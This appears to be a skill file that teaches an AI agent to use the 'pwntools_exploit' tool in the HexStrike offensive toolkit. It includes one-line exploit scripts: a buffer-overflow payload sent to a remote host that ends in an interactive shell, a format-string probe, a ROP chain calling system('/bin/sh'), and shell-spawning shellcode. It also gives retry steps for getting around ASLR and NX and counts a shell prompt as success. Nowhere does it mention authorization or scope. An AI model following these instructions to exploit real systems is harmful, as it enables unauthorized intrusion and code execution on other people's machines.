---
name: "hexstrike-pwntools"
description: "Correct parameters and usage patterns for HexStrike pwntools_exploit MCP tool - exploit development and execution."
---

# HexStrike pwntools_exploit - Tool Skill

Exploit development and execution framework. Used for binary exploitation, buffer overflows, format string attacks, ROP chains, and custom exploit development. This is the low-level exploitation tool for when Metasploit modules are not available.

## Accepted Parameters

| Parameter | Type   | Required | Description                                                              |
| --------- | ------ | -------- | ------------------------------------------------------------------------ |
| `script`  | string | **YES**  | Python exploit script using pwntools (the actual script content or path) |
| `flags`   | string | no       | Additional execution flags                                               |

## Common Usage

```
# Buffer overflow exploit
pwntools_exploit(script="from pwn import *; r = remote('10.10.99.120', 9999); payload = b'A'*100 + p32(0xdeadbeef); r.sendline(payload); r.interactive()")

# Format string exploit
pwntools_exploit(script="from pwn import *; r = remote('10.10.99.120', 1337); r.sendline(b'%x.%x.%x.%x'); print(r.recv())")

# ROP chain
pwntools_exploit(script="from pwn import *; elf = ELF('./vuln'); rop = ROP(elf); rop.call('system', [next(elf.search(b'/bin/sh'))]); print(rop.dump())")

# Shellcode generation
pwntools_exploit(script="from pwn import *; context.arch = 'amd64'; shellcode = asm(shellcraft.sh()); print(shellcode.hex())")

# Run existing exploit script
pwntools_exploit(script="/path/to/exploit.py")
```

## When to Use pwntools

- **Binary exploitation** - buffer overflows, heap exploitation, use-after-free
- **Custom protocol exploitation** - non-HTTP services with proprietary protocols
- **Exploit development** - writing new exploits for discovered vulnerabilities
- **CTF-style challenges** - when the target has custom vulnerable binaries
- **When Metasploit has no module** - pwntools can craft exploit from scratch

## When NOT to Use

- Web application vulnerabilities (use sqlmap, dalfox, commix)
- Known CVEs with Metasploit modules (use metasploit_run)
- Brute-force attacks (use hydra_attack)
- Standard scanning (use nuclei, nikto)

## Retry Strategy

1. **Connection refused**: Verify target service is running on specified port
2. **Exploit crashes target**: Reduce payload size, check offset calculation
3. **ASLR/NX/PIE enabled**: Adjust exploit technique (ROP for NX, leak for ASLR)
4. **Wrong architecture**: Check target architecture with nmap OS detection first
5. **Script errors**: Debug locally before running against target

## Output Interpretation

- **Shell prompt received** - SUCCESS. You have code execution. Document with `id`, `whoami`.
- **Segfault** - exploit crashed the process. Offset or payload may be wrong.
- **Connection reset** - exploit detected or process crashed without shell.
- **Timeout** - service may have died. Check if it auto-restarts.

## Evidence Capture

Save exploit script and output to `output/{target}/exploits/raw/pwntools_*.txt`. Document the full exploitation chain: vulnerability, offset calculation, payload, and resulting access.
